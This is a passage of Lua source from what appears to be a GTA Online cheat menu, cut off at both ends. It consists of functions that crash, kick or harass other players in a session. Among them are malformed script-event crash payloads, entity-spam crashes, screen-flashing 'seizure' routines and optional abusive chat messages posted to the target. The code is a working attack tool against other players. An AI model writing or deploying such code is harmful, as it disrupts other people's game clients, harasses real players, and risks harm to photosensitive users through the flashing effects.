local mdl = util.joaat("A_C_Cat_01")
local mdl2 = util.joaat("U_M_Y_Zombie_01")
local mdl3 = util.joaat("A_F_M_ProlHost_01")
local mdl4 = util.joaat("A_M_M_SouCent_01")
local veh_mdl = util.joaat("insurgent2")
local veh_mdl2 = util.joaat("brawler")
util.request_model(veh_mdl)
util.request_model(veh_mdl2)
util.request_model(mdl)
util.request_model(mdl2)
util.request_model(mdl3)
util.request_model(mdl4)
for i = 1, 250 do
    local ped1 = entities.create_ped(1, mdl, pos + 20, 0)
    local ped_ = entities.create_ped(1, mdl2, pos + 20, 0)
    local ped3 = entities.create_ped(1, mdl3, pos + 20, 0)
    local ped3 = entities.create_ped(1, mdl4, pos + 20, 0)
    local veh = entities.create_vehicle(veh_mdl, pos + 20, 0)
    local veh2 = entities.create_vehicle(veh_mdl2, pos + 20, 0)
    PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
    PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
    PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
    PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
    PED.SET_PED_INTO_VEHICLE(ped1, veh, -1)
    PED.SET_PED_INTO_VEHICLE(ped_, veh, -1)
    PED.SET_PED_INTO_VEHICLE(ped1, veh2, -1)
    PED.SET_PED_INTO_VEHICLE(ped_, veh2, -1)
    PED.SET_PED_INTO_VEHICLE(mdl3, veh, -1)
    PED.SET_PED_INTO_VEHICLE(mdl3, veh2, -1)
    PED.SET_PED_INTO_VEHICLE(mdl4, veh, -1)
    PED.SET_PED_INTO_VEHICLE(mdl4, veh2, -1)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(mdl3, veh2, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(mdl4, veh2, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped1, veh2, ped, 10.0, 0, 10, 0, 0)
    TASK.TASK_VEHICLE_HELI_PROTECT(ped_, veh2, ped, 10.0, 0, 10, 0, 0)
    wait(100)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl3, 0, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl4, 0, 0, 0)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskDoNothing", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl4, "CTaskDoNothing", 0, false)
    ENTITY.SET_ENTITY_HEALTH(mdl, false, 200)
    ENTITY.SET_ENTITY_HEALTH(mdl2, false, 200)
    ENTITY.SET_ENTITY_HEALTH(mdl3, false, 200)
    ENTITY.SET_ENTITY_HEALTH(mdl4, false, 200)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl, 0, 0, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 2, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 1, 0)
    PED.SET_PED_COMPONENT_VARIATION(mdl2, 0, 0, 0)
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(mdl2)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskInVehicleBasic", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl2, "CTaskAmbientClips", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(mdl3, "CTaskAmbientClips", 0, false)
    PED.SET_PED_INTO_VEHICLE(mdl, veh, -1)
    PED.SET_PED_INTO_VEHICLE(mdl2, veh, -1)
    ENTITY.SET_ENTITY_PROOFS(veh_mdl, true, true, true, true, true, false, false, true)
    ENTITY.SET_ENTITY_PROOFS(veh_mdl2, true, true, true, true, true, false, false, true)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicle", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskWaitForSteppingOut", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskInVehicleSeatShuffle", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl, "CTaskExitVehicleSeat", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicle", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskWaitForSteppingOut", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskInVehicleSeatShuffle", 0, false)
    TASK.TASK_START_SCENARIO_IN_PLACE(veh_mdl2, "CTaskExitVehicleSeat", 0, false)
end
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(mdl2)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl)
STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(veh_mdl2)
entities.delete_by_handle(mdl)
entities.delete_by_handle(mdl2)
entities.delete_by_handle(mdl3)
entities.delete_by_handle(mdl4)
entities.delete_by_handle(veh_mdl)
entities.delete_by_handle(veh_mdl2)
wait(1000)
end]]
function adacrash(pid)
    if toxicchatincrash then
    chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(pid) .." 白白崩溃正在努力把你送回您妈的逼里",false,true,true)
    if players.exists(pid) then
        menu.trigger_commands("planecrash " .. players.get_name(pid))
        wait(3000)
    end
    if players.exists(pid) then
        menu.trigger_commands("wenyi " .. players.get_name(pid))
        wait(3000)
    end
    if players.exists(pid) then
        menu.trigger_commands("nature " .. players.get_name(pid))
    end
        wait(8000) 
    if players.exists(pid) then
        gtoast("再等会")
        wait(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(pid))
        wait(2500)
        gtoast("成功移除此玩家")
    end
else
    if players.exists(pid) then
        menu.trigger_commands("planecrash " .. players.get_name(pid))
        wait(3000)
    end
    if players.exists(pid) then
        menu.trigger_commands("wenyi " .. players.get_name(pid))
        wait(3000)
    end
    if players.exists(pid) then
        menu.trigger_commands("nature " .. players.get_name(pid))
    end
        wait(8000) 
    if players.exists(pid) then
        gtoast("再等会")
        wait(2000)
        menu.trigger_commands("adaptivekick " .. players.get_name(pid))
        wait(2500)
        gtoast("成功移除此玩家")
        end
    end
end
function gtcrash(pid)
    if toxicchatincrash then
        chat.send_message('> ' .. PLAYER.GET_PLAYER_NAME(pid) .." 草泥马了",false,true,true)
        if players.exists(pid) then
            menu.trigger_commands("5gcrash " .. players.get_name(pid))
            wait(3000)
        end
        if players.exists(pid) then
            menu.trigger_commands("lestercrestcrash " .. players.get_name(pid))
            wait(3000)
        end
        if players.exists(pid) then
            menu.trigger_commands("inshell " .. players.get_name(pid))
        end
            wait(8000) 
        if players.exists(pid) then
            gtoast("再等会")
            wait(2000)
            menu.trigger_commands("adaptivekick " .. players.get_name(pid))
            wait(2500)
            gtoast("成功移除此玩家")
    end
        else
            if players.exists(pid) then
            menu.trigger_commands("5gcrash " .. players.get_name(pid))
            wait(3000)
            end
            if players.exists(pid) then
            menu.trigger_commands("lestercrestcrash " .. players.get_name(pid))
            wait(3000)
            end
            if players.exists(pid) then
            menu.trigger_commands("inshell " .. players.get_name(pid))
            end
            wait(8000) 
            if players.exists(pid) then
            gtoast("再等会")
            wait(2000)
            menu.trigger_commands("adaptivekick " .. players.get_name(pid))
            wait(2500)
            gtoast("成功移除此玩家")
        end
    end
end
--aio崩溃
local getEntityCoords = ENTITY.GET_ENTITY_COORDS
local getPlayerPed = PLAYER.GET_PLAYER_PED
function aaio(pid)
if players.exists(pid) then
        local mdl = util.joaat("apa_mp_apa_yacht")
        local user = players.user_ped()
		local old_pos = ENTITY.GET_ENTITY_COORDS(user, false)
        BlockSyncs(pid, function()
		wait(250)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user, 0xFBAB5776, 100, false)
            PLAYER.SET_PLAYER_HAS_RESERVE_PARACHUTE(players.user())
            PLAYER._SET_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user(), mdl)
            wait(50)
            local pos = players.get_position(pid)
            pos.z += 300
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            repeat
                wait()
            until PED.GET_PED_PARACHUTE_STATE(user) == 0
            PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
            wait(50)
            TASK.CLEAR_PED_TASKS(user)
            wait(50)
            PED.FORCE_PED_TO_OPEN_PARACHUTE(user)
            repeat
                wait()
            until PED.GET_PED_PARACHUTE_STATE(user) ~= 1
            pcall(TASK.CLEAR_PED_TASKS_IMMEDIATELY, user)
            PLAYER.CLEAR_PLAYER_RESERVE_PARACHUTE_MODEL_OVERRIDE(players.user())
            pcall(ENTITY.SET_ENTITY_COORDS, user, old_pos.x,old_pos.y,old_pos.z, false, false)
        end)
    end
if players.exists(pid) then
local user = players.user()
        local user_ped = players.user_ped()
        local pos = players.get_position(user)
        BlockSyncs(pid, function() 
            wait(100)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
            wait()
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
            wait(250)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
            wait(1000)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT)
            end
            ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)
        end)
    end
if players.exists(pid) then
local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
            local pos=ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1,"10s",pos.x,pos.y,pos.z,"MP_MISSION_COUNTDOWN_SOUNDSET",true, 70, false)
            end
            wait(0)
        end
    end 
if players.exists(pid) then
local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
            local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
            for i = 1, 20 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Event_Message_Purple', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1000, false)
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', pos.x, pos.y, pos.z, 'GTAO_FM_Events_Soundset', true, 1000, false)
            end
            wait()
        end	
    end
if players.exists(pid) then
              local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
              local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
              pos.z = pos.z + 10
              veh = entities.get_all_vehicles_as_handles()
            for i = 1, #veh do
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
            TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
            end
        end
if players.exists(pid) then
    local hashes = {1492612435, 3517794615, 3889340782, 3253274834}
    local vehicles = {}
    for i = 1, 4 do
        util.create_thread(function()
            RqModel(hashes[i])
            local pcoords = getEntityCoords(getPlayerPed(pid))
            local veh =  VEHICLE.CREATE_VEHICLE(hashes[i], pcoords.x, pcoords.y, pcoords.z, math.random(0, 360), true, true, false)
            for a = 1, 20 do NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh) end
            VEHICLE.SET_VEHICLE_MOD_KIT(veh, 0)
            for j = 0, 49 do
                local mod = VEHICLE.GET_NUM_VEHICLE_MODS(veh, j) - 1
                VEHICLE.SET_VEHICLE_MOD(veh, j, mod, true)
                VEHICLE.TOGGLE_VEHICLE_MOD(veh, mod, true)
            end
            for j = 0, 20 do
                if VEHICLE.DOES_EXTRA_EXIST(veh, j) then VEHICLE.SET_VEHICLE_EXTRA(veh, j, true) end
            end
            VEHICLE.SET_VEHICLE_TYRES_CAN_BURST(veh, false)
            VEHICLE.SET_VEHICLE_WINDOW_TINT(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(veh, 1)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(veh, " ")
            for ai = 1, 50 do
                NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh)
                pcoords = getEntityCoords(getPlayerPed(pid))
                ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh, pcoords.x, pcoords.y, pcoords.z, false, false, false)
                wait()
            end
            vehicles[#vehicles+1] = veh
        end)
    end
	end
if players.exists(pid) then	
		for pedp_crash = 2 , 6 do
	pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    pos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
    dune = CreateVehicle(410882957,pos,ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dune, true)
    dune1 = CreateVehicle(2971866336,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dune1, true)
    barracks = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks, true)
    barracks1 = CreateVehicle(444583674,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks1, true)
    dunecar = CreateVehicle(2971866336,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar, true)
    dunecar1 = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar1, true)
    dunecar2 = CreateVehicle(444583674,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(dunecar2, true)
    barracks3 = CreateVehicle(4244420235,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks3, true)
    barracks31 = CreateVehicle(3602674979,pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
    ENTITY.FREEZE_ENTITY_POSITION(barracks31, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks3, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks31, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(barracks1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dune, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dune1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar1, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar2, dunecar, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(dunecar, pedp, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
    wait(5000)
	for i = 0, 100  do
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(dunecar, pos.x, pos.y, pos.z, false, true, true)
			wait(10)
		end
        wait(2000)
        entities.delete_by_handle(dune)
        entities.delete_by_handle(dune1)
        entities.delete_by_handle(barracks)
        entities.delete_by_handle(barracks1)
        entities.delete_by_handle(dunecar)
        entities.delete_by_handle(dunecar1)
        entities.delete_by_handle(dunecar2)
        entities.delete_by_handle(barracks3)
        entities.delete_by_handle(barracks31)
    end
end
            if players.exists(pid) then
            menu.trigger_commands("oxcrash " .. players.get_name(pid))
            end
            wait(100)
            if players.exists(pid) then
                notification("崩溃似乎已被目标拦截")
          else
            notification("成功移除此玩家")
            end
            notification("完成")
end
--脚本事件崩溃
function scriptcrash(pid)
    util.trigger_script_event(1 << pid, { -555356783, pid ,85952,99999,52682274855,526822745 })
    util.trigger_script_event(1 << pid, { 526822748, pid ,78552,99999 ,7949161,789454312})
    util.trigger_script_event(1 << pid, { -66669983, pid ,526822748,555555, math.random(80521,2959749521) })
    util.trigger_script_event(1 << pid, { -1733737974, pid ,789522 ,59486,48512151,-9545440,5845131,848153,math.random(1,2959749),189958})
    util.trigger_script_event(1 << pid, { -1529596656, pid ,795221,59486,48512151,-9545440 , math.random(1,2959749) })
    util.trigger_script_event(1 << pid, { -8965204809, pid ,795221,59486,48512151,-9545440 })
end
---主机崩
function hostcrash(pid)
    local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    menu.trigger_commands("tpmazehelipad")
    ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
    wait(1000)
    menu.trigger_commands("tpmazehelipad")
end
--闪屏 V1
function seizurev1(pid)
local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local playerpos = ENTITY.GET_ENTITY_COORDS(id)
playerpos.z = playerpos.z + 3
local khanjali = util.joaat("cargobob")
STREAMING.REQUEST_MODEL(khanjali)
while not STREAMING.HAS_MODEL_LOADED(khanjali) do
    wait()
end
local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
wait(0)
entities.delete_by_handle(vehicle1)
local khanjali = util.joaat("kosatka")
STREAMING.REQUEST_MODEL(khanjali)
while not STREAMING.HAS_MODEL_LOADED(khanjali) do
    wait()
end
local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
wait(0)
entities.delete_by_handle(vehicle1)
end
--闪屏 V2
function seizurev2(pid)
local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local playerpos = ENTITY.GET_ENTITY_COORDS(id)
playerpos.z = playerpos.z + 3
local khanjali = util.joaat("cargoplane")
STREAMING.REQUEST_MODEL(khanjali)
while not STREAMING.HAS_MODEL_LOADED(khanjali) do
    wait()
end
local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, 180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, 180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
wait(0)
entities.delete_by_handle(vehicle1)
local id = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
local playerpos = ENTITY.GET_ENTITY_COORDS(id)
playerpos.z = playerpos.z + 3
local khanjali = util.joaat("cargoplane")
STREAMING.REQUEST_MODEL(khanjali)
while not STREAMING.HAS_MODEL_LOADED(khanjali) do
    wait()
end
local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
wait(0)
entities.delete_by_handle(vehicle1)
local khanjali = util.joaat("cargobob")
STREAMING.REQUEST_MODEL(khanjali)
while not STREAMING.HAS_MODEL_LOADED(khanjali) do
    wait()
end
local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
wait(0)
entities.delete_by_handle(vehicle1)
local khanjali = util.joaat("kosatka")
STREAMING.REQUEST_MODEL(khanjali)
while not STREAMING.HAS_MODEL_LOADED(khanjali) do
    wait()
end
local vehicle1 = entities.create_vehicle(khanjali, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 2, 3), ENTITY.GET_ENTITY_HEADING(id))
local vehicle2 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle3 = entities.create_vehicle(khanjali, playerpos, 0)
local vehicle4 = entities.create_vehicle(khanjali, playerpos, 0)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle1)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle2)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle3)
NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(vehicle4)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle2, vehicle1, 0, 0, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle3, vehicle1, 0, 3, 3, 0, 0, 0, -180, 0, false, true, false, 0, true)
ENTITY.ATTACH_ENTITY_TO_ENTITY(vehicle4, vehicle1, 0, 3, 0, 0, 0, 0, 0, 0, false, true, false, 0, true)
ENTITY.SET_ENTITY_VISIBLE(vehicle1, true)
wait(0)
entities.delete_by_handle(vehicle1)
end
-- 无效载具小飞机
function BadOutfitCrashV2(pid)
    local getEntityCoords = ENTITY.GET_ENTITY_COORDS
    local getPlayerPed = PLAYER.GET_PLAYER_PED
    local hashes = {0xc5dd6967}
